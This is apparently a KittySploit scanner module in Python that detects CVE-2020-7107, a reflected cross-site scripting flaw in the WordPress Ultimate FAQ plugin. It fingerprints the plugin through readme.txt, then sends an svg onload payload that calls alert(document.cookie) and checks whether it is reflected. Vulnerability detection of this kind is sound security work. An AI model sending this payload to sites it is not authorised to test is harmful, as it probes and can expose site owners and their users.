#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Ultimate FAQ plugin before 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Ultimate FAQ <1.8.30 - Cross-Site Scripting Detection',
        'description': 'WordPress Ultimate FAQ plugin before 1.8.30 is susceptible to cross-site scripting via Display_FAQ to Shortcodes/DisplayFAQs.php. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'ultimate-faqs', 'wpscan', 'xss', 'wordpress', 'wp-plugin', 'wp', 'etoilewebdesign', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/5e1cefd5-5369-44bd-aef7-2a382c8d8e33',
            'https://wordpress.org/plugins/ultimate-faqs/',
            'https://plugins.trac.wordpress.org/changeset/2222959/ultimate-faqs/tags/1.8.30/Shortcodes/DisplayFAQs.php',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-7107',
            'https://wordpress.org/plugins/ultimate-faqs/#developers',
        ],
        'cve': 'CVE-2020-7107',
    }

    def run(self):
        path = '/wp-content/plugins/ultimate-faqs/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Ultimate FAQ', 'Tags:',)
        if not (all(m in body for m in body_all)):
            return False
        path = '/?Display_FAQ=%3C/script%3E%3Csvg/onload=alert(document.cookie)%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ("'</script><svg/onload=alert(document.cookie)>", 'var Display_FAQ_ID =',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='WordPress Ultimate FAQ <1.8.30 - Cross-Site Scripting detected', path=path)
            return True
        return False

